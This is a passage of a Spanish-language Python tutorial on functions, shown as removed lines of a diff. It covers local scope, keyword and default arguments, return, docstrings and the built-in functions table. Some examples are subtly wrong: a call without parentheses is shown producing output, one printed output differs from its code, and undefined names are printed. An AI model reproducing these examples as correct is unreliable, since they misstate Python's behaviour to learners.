-&lt;p&gt;Como vemos lo que ocurre es que el interprete de &lt;code&gt;python&lt;/code&gt; me dara un error, donde me dira que a la &lt;code&gt;función&lt;/code&gt; que defini previamente con tres argumentos me ha faltado ponerle un elemento posicional correspondiente a &lt;code&gt;argumento3&lt;/code&gt;. Ya que ha identificado un valor para &lt;code&gt;argumento1 y argumento2&lt;/code&gt;, pero no para &lt;code&gt;argumento3&lt;/code&gt;. Y como es un argumento posicional es obligatorio que ponga el mismo numero de argumentos como parametros definamos en nuestra &lt;code&gt;función&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Los parámetros se comportan como variables que estan definidas de manera local a la función (únicamente en el cuerpo de la función). Cuando se invoca la función, los argumentos que se le proporcionan se asignan a los parámetros en el orden en el que estuvieran definidos. Esto quiere decir que los parametros que yo estoy poniendo en la definición de la función se van a comportar como variables dentro del cuerpo de la función, pero no fuera del cuerpo.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Vamos a ver un ejemplo para entender esto mejor:&lt;/p&gt;
-
-&lt;p&gt;Primero voy a definir una función que no recibira ningun argumento, lo que hara sera simplemente crear una variable &lt;code&gt;var&lt;/code&gt; que le asignara una cadena de texto y me lo imprimira por pantalla.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
-    var = &quot;mi variable 'var' dentro de la funcion&quot;
-    print(var)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora voy a definir otra variable con el mismo nombre &lt;code&gt;var&lt;/code&gt; fuera de la función y le voy a asignar una cadena de texto. Seguidamente llamara a mi función previamente creada y finalmente imprimire por pantalla la variable &lt;code&gt;var&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;var = &quot;variable 'var' fuera de mi función&quot;
-mi_funcion
-print(var)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora al ejecutar esto lo que me muestra es:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable 'var' dentro de la funcion
-variable 'var' fuera de la funcion
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como podemos ver lo primero que me imprime el programa es &lt;code&gt;variable 'var' dentro de la funcion&lt;/code&gt; y despues &lt;code&gt;variable 'var' fuera de la funcion&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Esto ocurre por que tanto los parametros y variables que definamos dentro de una &lt;code&gt;función&lt;/code&gt; van a estar en el contexto local de esa &lt;code&gt;función&lt;/code&gt; y no va a afectar a lo que hayamos definido fuera. Por ello aunque yo haya definido una variable con el mismo nombre, para &lt;code&gt;python&lt;/code&gt; son variables diferentes ya que se encuentran en contextos diferentes, una dentro de la función y otra fuera de esta.&lt;/p&gt;
-
-&lt;h3 id=&quot;argumentos-de-palabras-clave&quot;&gt;Argumentos de Palabras Clave&lt;/h3&gt;
-
-&lt;p&gt;Otra manera de invocar una función en &lt;code&gt;Python&lt;/code&gt; es indicando los argumentos de la forma &lt;code&gt;&amp;lt;palabra clave&amp;gt;=&amp;lt;valor&amp;gt;&lt;/code&gt;. En ese caso, cada &lt;code&gt;&amp;lt;palabra clave&amp;gt;&lt;/code&gt; debe coincidir con un parámetro en la definición de la función.&lt;/p&gt;
-
-&lt;p&gt;Veamoslo mejor en un ejemplo para entenderlo bien:&lt;/p&gt;
-
-&lt;p&gt;Comencemos definiendo una función&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2):
-    print(argumento1)
-    print(argumento2)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente que hare sera invocar la &lt;code&gt;función&lt;/code&gt; pero en este caso le pasare argumentos de palabra clave en lugar de posicionales.&lt;/p&gt;
-
-&lt;p&gt;Voy a definir dos variables&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = &quot;Hola Python&quot;
-variable2 = &quot;Adios Python&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora llamare a mi &lt;code&gt;función&lt;/code&gt;, pero en lugar de pasarle las variables como argumentos posicionales, que seria algo como &lt;code&gt;mi_funcion(variable1, variable2)&lt;/code&gt;. Lo que hare sera indicarle el nombre del parametro que quiero que este asociado con el argumento que le pase.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable1, argumento2=variable2)
-
-Hola Python
-Adios Python
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Si quisiera podria invertirlo y el resultado me lo sacaria alreves.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable2, argumento2=variable1)
-
-Adios Python
-Hola Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Una cosa que es importante sobre los &lt;code&gt;argumentos de palabras clave&lt;/code&gt; es que no tenemos que respetar el orden de los parametros para pasarle los argumentos.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Aunque en la definición de nuestra &lt;code&gt;función&lt;/code&gt; pusimos como primer parametro &lt;code&gt;argumento1&lt;/code&gt; y segundo &lt;code&gt;argumento2&lt;/code&gt;. Como yo le digo a que valor estan asignados, puedo cambiar el orden y no necesitamos que esten en el mismo orden que en la definición.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento2=variable1, argumento1=variable2)
-
-Adios Python
-Hola Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Otra cosa que debemos tener en cuenta es que no podemos poner el nombre de un argumento que no se encuentre definido como parametro de la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable1, argumento3=variable2)
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-17-96e6349729cf&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 mi_funcion(argumento1=variable1, argumento3=variable2)
-
-TypeError: mi_funcion() got an unexpected keyword argument 'argumento3'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Logicamente &lt;code&gt;python&lt;/code&gt; me dara un error ya que el &lt;code&gt;argumento3&lt;/code&gt; no se encuentra en la definición de nuestra &lt;code&gt;función&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;De la misma manera tenemos que respetar el numero de argumentos que le pasamos al invocar nuestra &lt;code&gt;función&lt;/code&gt;. De otra manera este nos dara un error de que falta un argumento posicional.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable1)
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-20-c46543542516&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 mi_funcion(argumento1=variable1)
-
-TypeError: mi_funcion() missing 1 required positional argument: 'argumento2'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Otra de las cosas interesantes que nos permite hacer &lt;code&gt;Python&lt;/code&gt;, es la combinación argumentos posicionales y de palabra clave en la misma llamada a una función. En estos casos, siempre los argumentos posicionales deben indicarse primero.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2):
-    print(argumento1)
-    print(argumento2)
-
-variable1 = &quot;Hola Python&quot;
-variable2 = &quot;Adios Python&quot;
-
-
-mi_funcion(variable1, argumento2=variable2)
-
-Hola Python
-Adios Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como podemos ver que efectivamente el programa se nos ejecuta correctamente.&lt;/p&gt;
-
-&lt;p&gt;Pero ahora que pasa si yo pongo el segundo parametro comi posicional.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1 = variable1, variable2)
-    mi_funcion(arg1=var, var2)
-                             ^
-SyntaxError: positional argument follows keyword argument
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Pues esto me dara un error que me dira que hay un argumento posicional que sigue a un argumento de palabra clave. Entonces necesariamente tiene que ser alreves.&lt;/p&gt;
-
-&lt;h3 id=&quot;parametros-con-valores-por-defecto&quot;&gt;Parametros con Valores por defecto&lt;/h3&gt;
-
-&lt;p&gt;Si especificamos un parámetro en la definición de una función en &lt;code&gt;Python&lt;/code&gt; utilizando la forma &lt;code&gt;&amp;lt;nombre&amp;gt;=&amp;lt;valor&amp;gt;&lt;/code&gt;, entonces &lt;code&gt;&amp;lt;valor&amp;gt;&lt;/code&gt; se convierte en un valor por defecto para ese parámetro. A eso denominamos parametros por defecto.&lt;/p&gt;
-
-&lt;p&gt;Vamos a definir una función, donde le pasaremos dos parametros y que el segundo correspondera a uno por defecto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2=&quot;Valor por defecto&quot;):
-    print(argumento1)
-    print(argumento2)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo que me permite es jugar con el numero de argumentos que le paso a la función, ya que esta vez puedo pasarle menos argumentos de los que estan definidos al invocar a la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;)
-
-Hola Python
-Valor por defecto
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo que hace la función es decir que el primer argumento necesita si o si que me pase un valor, entonces como ya se lo pasamos, esto lo asignara a &lt;code&gt;argumento1&lt;/code&gt; y nos los sacara por pantalla este primer argumento. Ahora en lo que corresponde al segundo parametro si le pasamos algo lo asignara a &lt;code&gt;argumento2&lt;/code&gt;, de lo contrario cogera el valor que tiene por defecto y como en este caso no le pasamos nada lo que hizo fue imprimirnos el valor por defecto.&lt;/p&gt;
-
-&lt;p&gt;Pero si ahora yo le indico un valor. Como esta vez le estamos asignando un valor al &lt;code&gt;argumento2&lt;/code&gt;, esta vez no necesitara el valor por defecto y por lo tanto lo descarta y imprimira el valor que le hayamos pasado.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)
-
-Hola Python
-Adios Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;sentencia-return&quot;&gt;Sentencia Return&lt;/h2&gt;
-
-&lt;p&gt;Las funciones en &lt;code&gt;Python&lt;/code&gt; pueden retornar un valor despues de haber ejecutado las sentencias de código definidas. Para devolver un valor, se debe utilizar la palabra &lt;code&gt;return&lt;/code&gt; dentro del cuerpo de la función.&lt;/p&gt;
-
-&lt;p&gt;Ahora hay que tener en cuenta algunas cosas cuando utilizamos &lt;code&gt;return&lt;/code&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Cuando se ejecuta &lt;code&gt;return&lt;/code&gt; en &lt;code&gt;Python&lt;/code&gt;, el intérprete termina inmediatamente la ejecución de la función y regresa a la línea de código desde dónde la hubiésemos invocado.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Vamos a verlo en un ejemplo mas practico.&lt;/p&gt;
-
-&lt;p&gt;Comenzamos definiendo una función simple donde ejecutaremos un &lt;code&gt;print&lt;/code&gt; de un texto, despues usaremos la sentencia &lt;code&gt;return&lt;/code&gt; y finalmente volveremos a ejecutar otro &lt;code&gt;print&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
-    print(&quot;Sentencia 1 dentro de mi funcion&quot;)
-    return
-    print(&quot;Sentencia 2 dentro de mi funcion&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora escribiremos codigo fuera de nuestra función, donde primero haremos un &lt;code&gt;print&lt;/code&gt;, despues llamaremos a la &lt;code&gt;función&lt;/code&gt; que creamos y finalmente usaremos otro &lt;code&gt;print&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Sentencia 1 fuera de mi funcion&quot;)
-mi_funcion()
-print(&quot;Sentencia 2 fuera de mi funcion&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al ejecutar esto lo que pasara es que se ejecutara la primera linea, despues ejecutara nuestra &lt;code&gt;función&lt;/code&gt;, la cual tiene tres lineas donde se ejecutara la primera linea con normalidad, pero después en la segunda linea al estar la sentencia &lt;code&gt;return&lt;/code&gt;, terminara la ejecución de nuestra &lt;code&gt;función&lt;/code&gt; sin ejecutar la tercera linea y retornara la ejecución a donde se ejecuto la &lt;code&gt;función&lt;/code&gt; y en consecuencia se ejecutara el &lt;code&gt;print&lt;/code&gt; de la ultima linea.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;Sentencia 1 fuera de mi funcion
-Sentencia 1 dentro de mi funcion
-Sentencia 2 fuera de mi funcion
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Si definimos la palabra &lt;code&gt;return&lt;/code&gt; de la forma &lt;code&gt;return &amp;lt;valor&amp;gt;&lt;/code&gt; se retornará el &lt;code&gt;&amp;lt;valor&amp;gt;&lt;/code&gt; especificado en la llamada a dicha función.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
-    return &quot;Valor de la funcion&quot;
-    print(&quot;Esta linea nunca podra ejecutarse&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Esto nos permite que al invocar nuestra &lt;code&gt;función&lt;/code&gt; podamos recibirla en una variable. Y lo que hara la &lt;code&gt;función&lt;/code&gt; sera ejecutarme el &lt;code&gt;return&lt;/code&gt; y devolverme el resultado en la variable &lt;code&gt;mi_variable&lt;/code&gt;, que en consecuencia al imprimirla me deolvera la cadena de texto que esta asociada al &lt;code&gt;return&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Cabe mencionar que el &lt;code&gt;print&lt;/code&gt; de la &lt;code&gt;función&lt;/code&gt; no se ejecutara debido a que debemos recordar que el &lt;code&gt;return&lt;/code&gt; termina la ejecución de la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_variable = mi_funcion()
-
-print(mi_variable)
-
-Valor de la funcion
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tambien podria ejecutar mi &lt;code&gt;función&lt;/code&gt; sin asignarsela a ninguna variable.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion()
-
-Valor de la funcion
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ojito una cosa muy interesante tambien es que podria aplicar a esta &lt;code&gt;función&lt;/code&gt;. Ya que nos devuelve una cadena de texto, podria aplicar conceptos como el de &lt;code&gt;slide&lt;/code&gt;, &lt;code&gt;slicing&lt;/code&gt; y &lt;code&gt;stride&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion()[0:5]
-
-Valor
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Si no indicamos el término &lt;code&gt;&amp;lt;valor&amp;gt;&lt;/code&gt; en la sentencia &lt;code&gt;return&lt;/code&gt; se devuelve un tipo de datos conocido como &lt;code&gt;None&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
-    return
-
-variable = mi_funcion()
-
-print(variable)
-
-None
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Podemos utilizar la sentencia &lt;code&gt;return&lt;/code&gt; para devolver varios valores utilizando la sintaxis &lt;code&gt;return &amp;lt;valor1&amp;gt;,&amp;lt;valor2&amp;gt;,...,&amp;lt;valorn&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Supongamos que definimos una &lt;code&gt;función&lt;/code&gt; que queremos que retorne tres cadenas de texto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
-    return &quot;texto1&quot;,&quot;texto2&quot;,&quot;texto3&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y cogeria estos valores, definiendo tres variables e igualandolas a la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1,variable2,variable3 = mi_funcion()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si ahora imprimo las variables&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(var1)
-
-print(var2)
-
-print(var3)
-
-texto1
-texto2
-texto3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;docstrings&quot;&gt;Docstrings&lt;/h2&gt;
-
-&lt;p&gt;Los &lt;code&gt;docstring&lt;/code&gt; los utilizamos para proporcionar la documentación de una &lt;code&gt;función&lt;/code&gt;. Como el propósito de la función, los argumentos que va a tomar, información sobre los valores de retorno, o cualquier otra información que consideremos útil.&lt;/p&gt;
-
-&lt;p&gt;Cuando la primera declaración en el cuerpo de una &lt;code&gt;función&lt;/code&gt; en &lt;code&gt;Python&lt;/code&gt; es un string de la forma &lt;code&gt;&quot;&quot;&quot;texto&quot;&quot;&quot;&lt;/code&gt;, esto es lo que se conoce como &lt;code&gt;docstring&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Aqui tenemos un ejemplo de como lo podemos definir:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
-    &quot;&quot;&quot;Esto es un docstring de nuestra función&quot;&quot;&quot;
-    print(&quot;Hola Python&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tambien podemos definir &lt;code&gt;docstring&lt;/code&gt; de varias lineas.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion2(argumento1=4, argumento2=8):
-    &quot;&quot;&quot;Este es un docstring de varias líneas.
-
-    Argumentos:
-    argumento1 -- primer argumento de la funcion (valor por defecto 4)
-    argumento2 -- segundo argumento de la funcion (valor por defecto 8)
-    &quot;&quot;&quot;
-    return
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;funciones-propias-de-python&quot;&gt;Funciones Propias de Python&lt;/h2&gt;
-
-&lt;p&gt;El intérprete de &lt;code&gt;Python&lt;/code&gt; tiene una serie de funciones que están siempre disponibles. A continuación se enumeran en orden alfabético.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;strong&gt;Lista de Funciones&lt;/strong&gt;&lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;abs()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;delattr()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;hash()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;memoryview()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;set()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;all()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;dict()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;help()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;min()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;setattr()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;any()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;dir()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;hex()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;next()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;slice()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;ascii()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;divmod()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;id()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;object()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;sorted()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bin()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;enumerate()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;input()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;oct()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;staticmethod()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bool()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;eval()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;int()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;open()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;str()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;breakpoint()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;exec()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;isinstance()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;ord()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;sum()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bytearray()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;filter()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;issubclass()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;pow()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;super()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bytes()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;float()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;iter()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;print()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;tuple()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;callable()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;format()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;len()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;property()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;type()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;chr()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;frozenset()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;list()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;range()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;vars()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;classmethod()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;getattr()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;locals()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;repr()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;(zip)&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;compile()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;globals()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;map()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;reversed()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;__import__()&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;complex()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;hasattr()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;max()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;round()&lt;/strong&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Estas son todas las funciones disponibles que estan integradas en &lt;code&gt;python&lt;/code&gt;. A continuación veremos algunas de las mas importantes, pero no esta de mas practicar para ver de que trata cada una de ellas.&lt;/p&gt;
-
